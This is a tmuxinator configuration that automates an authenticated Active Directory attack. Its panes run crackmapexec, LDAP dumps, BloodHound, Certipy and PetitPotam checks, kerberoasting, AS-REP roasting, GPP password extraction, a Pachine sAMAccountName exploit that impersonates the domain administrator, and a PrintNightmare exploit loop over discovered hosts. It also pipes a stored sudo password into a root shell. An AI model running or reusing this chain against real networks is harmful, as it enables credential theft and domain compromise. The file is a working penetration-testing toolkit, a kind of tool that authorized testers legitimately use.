name: authd
root: /RSM/

#Notes
#   - find a way to make an option to auto-run vs prefill

# Variables/Defaults are set here
<%
  @settings["prefill"] ||= "python3 /RSM/prefillTest.py"
  @settings["domain"] ||= "domain.local"
  @settings["user"] ||= "user"
    #modify this value before running config
  @settings["pass"] ||= "thisisatestdefaultpasswordCHECK"
    #modify this value before running config
  @settings["nomadPass"] ||= "nomadPass"
  @settings["msfWorkspace"] ||= "newClient"
    #this must be unique to avoid potential conflict with prior testers
  @settings["rootDir"] ||= "/RSM"
  ### example of starting project with arguments: tmuxinator start internalTemplate domain=domain.local user=Sally pass="s8g9h3J##"
%>

on_project_start: if [ "<%= @settings['pass'] %>" = "thisisatestdefaultpasswordCHECK" ]; then echo 'Default password is still set in config file.\nEnsure your username and password are written (and saved) to the config file!\n'; fi; mkdir -p /opt/nomad-tools <%= @settings["rootDir"] %>/loot
pre_window: if [ "<%= @settings['pass'] %>" = "thisisatestdefaultpasswordCHECK" ]; then tmux kill-session; fi

# create and cd into client/testing folder before running
windows:
  - SMB: 
      panes:
        - cme:
          - tmux select-pane -T 'SMB shares' -t "authd:SMB.0"
          - mkdir -p <%= @settings["rootDir"] %>/scans/masscanPortList/smb; cd <%= @settings["rootDir"] %>/scans/masscanPortList/smb
          - crackmapexec smb <%= @settings["rootDir"] %>/scans/masscanPortList/smb.lst --shares -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' | tee <%= @settings["rootDir"] %>/scans/masscanPortList/smb/cme-<%= @settings["user"] %>-shares.txt
        - smbmap:
          - tmux select-pane -T 'smbmap' -t "authd:SMB.1"
          - <%= @settings["prefill"] %> "smbmap -H smbIP -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -R"; clear
        - dumpsterdiver:
          - tmux select-pane -T 'dumpsterdiver' -t "authd:SMB.2"
          - cd /opt/nomad-tools && git clone https://github.com/securing/DumpsterDiver.git && cd DumpsterDiver && pipenv install
          - pipenv run python3 DumpsterDiver.py --help
  - LDAP: 
      pre: mkdir -p <%= @settings["rootDir"] %>/loot/ldap-domaindump <%= @settings["rootDir"] %>/scans/ldap 
      panes:
        - ldapdomaindump:
          - tmux select-pane -T 'ldapdomaindump' -t "authd:LDAP.0"
          - mkdir -p <%= @settings["rootDir"] %>/loot/ldap-domaindump && cd <%= @settings["rootDir"] %>/loot/ldap-domaindump
          - ldapdomaindump -u '<%= @settings["domain"] %>\<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1)
        - getADusers:
          - tmux select-pane -T 'getADusers' -t "authd:LDAP.1"
          - GetADUsers.py -all '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/scans/ldap/getADUsers.txt
        - ldap signing:
          - tmux select-pane -T 'ldap signing' -t "authd:LDAP.2"
          - cd /opt/nomad-tools/LdapRelayScan/
          - python3 LdapRelayScan.py -method BOTH -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' | tee <%= @settings["rootDir"] %>/scans/ldap/ldapSigning.txt
        - get user descriptions:
          - tmux select-pane -T 'get user descriptions' -t "authd:LDAP.3"
          - crackmapexec ldap $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M get-desc-users | tee <%= @settings["rootDir"] %>/scans/ldap/userDescriptions.txt
        - MAQ:
          - tmux select-pane -T 'MAQ' -t "authd:LDAP.4"
          - crackmapexec ldap $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M MAQ | tee <%= @settings["rootDir"] %>/scans/ldap/MAQ.txt
        - ldap-checker:
          - tmux select-pane -T 'ldap-checker' -t "authd:LDAP.5"
          - crackmapexec ldap $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M ldap-checker | tee <%= @settings["rootDir"] %>/scans/ldap/ldap-checker-cme.txt
  - kerberoasting: 
      pre: mkdir -p <%= @settings["rootDir"] %>/loot/kerberoast
      panes:
        - kerberoasting:
          - tmux select-pane -T 'kerberoasting' -t "authd:kerberoasting.0"
          - mkdir <%= @settings["rootDir"] %>/kerberoast
          - GetUserSPNs.py '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -request -outputfile <%= @settings["rootDir"] %>/kerberoast/kerberoasting.txt
        - delegation:
          - tmux select-pane -T 'delegation' -t "authd:kerberoasting.1"
          - findDelegation.py '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'
  - samTheAdmin: 
      panes:
        - check:
          - tmux select-pane -T 'check' -t "authd:samTheAdmin.0"
          - cd /opt/nomad-tools && git clone https://github.com/ly4k/Pachine.git; cd Pachine && pipenv install
          - pipenv run python3 -m pip install ldap3 impacket
          - pipenv run python3 pachine.py -dc-host <%= @settings["domain"] %> -scan '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'
        - exploit:
          - tmux select-pane -T 'exploit' -t "authd:samTheAdmin.1"
          - cd /opt/nomad-tools/
          - <%= @settings["prefill"] %> "cd Pachine; pipenv run python3 pachine.py -dc-host ADD_NETBIOS_NAME.<%= @settings["domain"] %> -spn cifs/dc.<%= @settings["domain"] %> -impersonate administrator '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'"; clear; echo -e "\e[0;32mUpdate DC Netbios name\033[0m"; cat <%= @settings["rootDir"] %>/dcIP.txt; dig <%= @settings["rootDir"] %>/dcIP.txt | head -n 1
  - bloodhound: 
      pre: mkdir -p <%= @settings["rootDir"] %>/loot/bloodhound
      panes:
        - bloodhound:
          - tmux select-pane -T 'bloodhound' -t "authd:bloodhound.0"
          - git clone https://github.com/fox-it/BloodHound.py.git /opt/nomad-tools/Bloodhound.py
          - cd <%= @settings["rootDir"] %>/loot/bloodhound
          - python3 /opt/nomad-tools/BloodHound.py/bloodhound.py -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -c all -d <%= @settings["domain"] %>
  - ADCS: 
      pre: mkdir -p <%= @settings["rootDir"] %>/loot/ADCS
      panes:
        - cme ADCS:
          - tmux select-pane -T 'cme ADCS' -t "authd:ADCS.0"
          - crackmapexec ldap <%= @settings["rootDir"] %>/dcIP.txt -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M adcs
        - certipy:
          - tmux select-pane -T 'certipy' -t "authd:ADCS.1"
          - mkdir <%= @settings["rootDir"] %>/certipy
          - certipy find -u '<%= @settings["user"] %>@<%= @settings["domain"] %>' -p '<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -old-bloodhound -scheme ldap | tee <%= @settings["rootDir"] %>/loot/ADCS/certipy.txt
  - PetitPotam: 
      panes:
        - PetitPotam:
          - tmux select-pane -T 'PetitPotam' -t "authd:PetitPotam.0"
          - cd <%= @settings["rootDir"] %>/scans
          - crackmapexec smb $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M petitpotam | tee <%= @settings["rootDir"] %>/scans/petitpotam.txt
  - misc: 
      panes:
        - printNightmare:
          - tmux select-pane -T 'printNightmare' -t "authd:misc.0"
          - crackmapexec smb <%= @settings["rootDir"] %>/scans/masscanPortList/smb.lst -M spooler
          - echo <%= @settings['nomadPass'] %> | sudo -S su 
          - cd /opt/nomad-tools/; git clone https://github.com/eversinc34/ItWasAllADream.git && cd ItWasAllADream && docker build -t itwasalladream .
          # grab hosts with open RPC ports (often more are found through additional nmap scans, but this can also be modified to use results from masscan)
          - msfconsole -q -x 'workspace-a <%= @settings["msfWorkspace"]  %>; services -u -O 6 -p 111,135,593,2049 -o <%= @settings["rootDir"] %>/scans/masscanPortList/rpcHosts.txt -c name; exit' && cat <%= @settings["rootDir"] %>/scans/masscanPortList/rpcHosts.txt | sed '1d' | cut -d "," -f 1 | tr -d '"' > <%= @settings["rootDir"] %>/scans/masscanPortList/rpcHosts-cleaned.txt
          # create docker container to test printerNightmare
          - for i in $(cat <%= @settings["rootDir"] %>/scans/masscanPortList/rpcHosts-cleaned.txt); do echo testing:$i; sudo docker run -it itwasalladream -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> $i; echo ""; done
        - GPP password:
          - tmux select-pane -T 'GPP password' -t "authd:misc.1"
          - crackmapexec smb <%= @settings["rootDir"] %>/dcIP.txt -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M gpp_password | tee <%= @settings["rootDir"] %>/scans/GPPpassword.txt
        - authd ASREProast:
          - tmux select-pane -T 'authd ASREP roast' -t "authd:misc.2"
          - <%= @settings["prefill"] %> 'GetNPUsers.py <%= @settings["domain"] %>/ -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -no-pass -usersfile $USERNAMEFILE.txt -outputfile <%= @settings["rootDir"] %>/scans/authd-asrepRoast.txt -format john'; clear

